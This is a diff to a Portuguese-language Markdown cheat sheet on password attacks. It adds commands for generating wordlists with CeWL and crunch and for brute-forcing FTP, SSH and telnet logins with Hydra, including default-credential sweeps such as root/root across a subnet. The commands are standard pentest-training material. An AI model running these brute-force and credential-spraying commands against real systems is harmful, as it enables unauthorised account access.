@@ -28,7 +28,9 @@ Wordlist Longato
 https://github.com/ricardolongatto/loncrack/blob/master/wl.txt
 
 
-Gerando mutação em wordlist
+
+
+## Gerando mutação em wordlist
 
 - Primeiro crie um lista com possiveis senhas utilizadas pelo alvo
 - Depois execute o comando abaixo para fazer a mudação usando o John
@@ -38,4 +40,91 @@ Caso queira acresentar algum tipo de modificação para insereir na mutação, v
 
 - Acesse: /etc/john/john.conf
 - Localize: List Rules Wordlist
-- 
+
+
+
+
+## Gerando wordlists personalizadas
+
+**CEWL**
+
+Gerando lista de palavras com base no site
+
+`cewl www.site.com -m 7 -w palavras`
+
+**CRUNCH**
+
+- % Digitos
+- ^ Caracteres Especiais
+- @ Caracteres Minúsculos
+- , Caracteres Maiúsculos
+
+Gerando lista com um padrão especifico
+
+`crunch 10 10 -t palavra^^%% -o wordlist `
+
+
+
+
+## Key Space Brute Force
+
+Exemplo 01
+
+`crunch 4 4 0123456789 -o pin `
+
+Exemplo 02
+
+`crunch 4 4 -f charset.lst mixalpha -o pin `
+
+
+
+
+## Brute force com Hydra
+
+Exemplo
+
+`hydra -v -L users.txt -P senhas.txt 192.168.0.1 ftp`
+
+
+
+
+## Reverse Brute force
+
+*Obs: Realiza o atque de força bruta no login e não na senha*
+
+Exemplo
+
+`hydra -v -L users.txt -p admin 192.168.0.1 ssh`
+
+
+
+
+## Low Hanging Fruit
+
+*Obs: Buscar os pontos mais fracos e fáceis (Ex: credenciais default)*
+
+Exemplo
+
+`hydra -v -l root -p root -M targets ssh`
+
+Exemplo
+
+`hydra -v -l root -p root -M 192.168.0.0/24 ssh`
+
+
+
+
+## Dicas Extras
+
+`man hydra`
+
+Exemplo
+
+`hydra -v -L users.txt -p senhas.txt 192.168.0.1 telnet -t 1 -W 5`
+
+
+
+
+## Construindo sua própria ferramenta
+
+
